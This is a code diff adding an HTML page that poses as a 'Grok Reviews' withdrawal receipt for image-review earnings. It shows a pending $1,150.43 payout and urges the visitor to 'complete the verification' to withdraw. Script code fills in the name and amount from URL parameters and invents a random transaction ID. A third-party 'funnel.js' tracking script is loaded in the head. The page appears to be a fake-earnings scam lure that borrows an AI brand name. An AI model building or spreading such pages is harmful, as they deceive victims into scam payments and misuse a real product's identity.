@@ -1,0 +1,64 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<script src="https://click-charm-73.lovable.app/funnel.js?w=976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd&f=bcb20cb6-2894-4e71-bd95-8e2167879456" data-auto="true" defer></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#111}
+.receipt{max-width:400px;margin:0 auto;padding:20px 16px;border:1px solid #e5e7eb;border-radius:12px;background:#fff}
+.receipt-header{text-align:center;padding-bottom:16px;border-bottom:1px dashed #d1d5db;margin-bottom:16px}
+.receipt-logo{width:32px;height:32px;margin:0 auto 8px;border-radius:50%;object-fit:contain}
+.receipt-brand{font-size:16px;font-weight:700;color:#111;margin-bottom:2px}
+.receipt-sub{font-size:11px;color:#6b7280;text-transform:uppercase;letter-spacing:.8px}
+.receipt-body{display:flex;flex-direction:column;gap:10px;margin-bottom:16px}
+.receipt-row{display:flex;justify-content:space-between;font-size:13px}
+.receipt-row .label{color:#6b7280;font-weight:500}
+.receipt-row .value{color:#111;font-weight:600;text-align:right}
+.receipt-row .value.green{color:#059669;font-weight:800;font-size:15px}
+.receipt-divider{border:none;border-top:1px dashed #d1d5db;margin:12px 0}
+.receipt-total{text-align:center;padding:14px 0;background:#f0fdf4;border-radius:8px;margin-bottom:12px}
+.receipt-total-label{font-size:10px;color:#059669;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
+.receipt-total-val{font-size:28px;font-weight:900;color:#059669}
+.receipt-footer{text-align:center;font-size:10px;color:#9ca3af;line-height:1.5}
+.receipt-status{display:inline-flex;align-items:center;gap:4px;background:#fef3c7;color:#92400e;font-size:11px;font-weight:700;padding:3px 10px;border-radius:99px;margin-bottom:12px}
+.receipt-status::before{content:'';width:6px;height:6px;background:#f59e0b;border-radius:50%}
+</style>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="receipt" id="receipt">
+<div class="receipt-header">
+<img class="receipt-logo" src="/robot-header-logo.png" alt="Grok">
+<div class="receipt-brand">Grok Reviews</div>
+<div class="receipt-sub">Withdrawal Receipt</div>
+</div>
+<div class="receipt-body">
+<div class="receipt-row"><span class="label">Recipient</span><span class="value" id="rName">User</span></div>
+<div class="receipt-row"><span class="label">Transaction ID</span><span class="value" id="rTxn">GRK-809821</span></div>
+<div class="receipt-row"><span class="label">Date</span><span class="value" id="rDate">Nov 12, 2026</span></div>
+<div class="receipt-row"><span class="label">Method</span><span class="value">Direct Deposit</span></div>
+<div class="receipt-row"><span class="label">Images Reviewed</span><span class="value">5</span></div>
+</div>
+<hr class="receipt-divider">
+<div class="receipt-total">
+<div class="receipt-total-label">Total Withdrawal Amount</div>
+<div class="receipt-total-val" id="rTotal">$1,150.43</div>
+</div>
+<div style="text-align:center"><span class="receipt-status">Pending Withdrawal</span></div>
+<div class="receipt-footer">This receipt confirms your earnings are ready.<br>Complete the verification to process your withdrawal.</div>
+</div>
+<script>
+var params=new URLSearchParams(window.location.search);
+var name=params.get('nome')||'User';
+var total=params.get('total')||'1150.43';
+document.getElementById('rName').textContent=name;
+document.getElementById('rTotal').textContent='$'+parseFloat(total).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
+document.getElementById('rTxn').textContent='GRK-'+Math.floor(100000+Math.random()*900000);
+var d=new Date();
+var months=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+document.getElementById('rDate').textContent=months[d.getMonth()]+' '+d.getDate()+', '+d.getFullYear();
+</script>
+</body>
+</html>
